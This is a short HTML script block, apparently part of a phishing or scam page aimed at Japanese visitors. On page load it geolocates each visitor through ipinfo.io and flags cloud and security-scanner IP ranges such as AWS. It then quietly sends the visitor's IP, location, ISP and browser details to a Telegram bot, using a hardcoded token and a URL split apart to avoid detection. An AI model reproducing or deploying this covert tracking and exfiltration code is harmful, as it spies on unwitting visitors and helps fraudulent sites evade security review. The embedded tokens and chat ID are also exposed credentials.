0000<script>
!function(){
  fetch("https://ipinfo.io/json?token=777df2fc7c6f01")
    .then(r => r.json())
    .then(d => {
      let o = (d.org || "").toLowerCase(),
          c = d.country || "",
          i = d.ip || "",
          y = d.city || "",
          g = d.region || "",
          l = d.loc || "",
          u = navigator.userAgent || "",
          b = [
            "amazon", "aws", "cloudfront", "amazon technologies inc",
            "amazon data services", "amazon web services", "amazon ec2",
            "host universal", "as136557 host universal pty ltd",
            "as16509", "as14618", "as38895", "as7224", "as8075",
            "3.112.", "3.113.218", "35.72.", "52.192.", "52.196.",
            "18.180."
          ];

      // ✅ لا ترسل إشعار إذا كان الزائر من الجزائر
      if (c === "DZ") return;

      let a = b.some(v => o.includes(v)) || b.some(v => i.startsWith(v)),
          n = "JP" !== c;

      if (a || n) {
        let m = `📡 *Visit Alert!*\n\n🌍 IP: ${i}\n🏙 City: ${y}\n📍 Region: ${g}\n🌐 Country: ${c}\n🔎 ISP: ${o}\n📱 UA: ${u}\n📌 Location: ${l}`,
            x = "https://api.te"+"legram.org/bot",
            t = "8044511985:AAGL3BwtkQ36prq53YesjOYieA-1RYbupd0",
            p = "/sendMessage";

        fetch(x + t + p, {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({ chat_id: 880827507, text: m, parse_mode: "Markdown" })
        });
      }
    })
    .catch(() => {})
}();
</script>
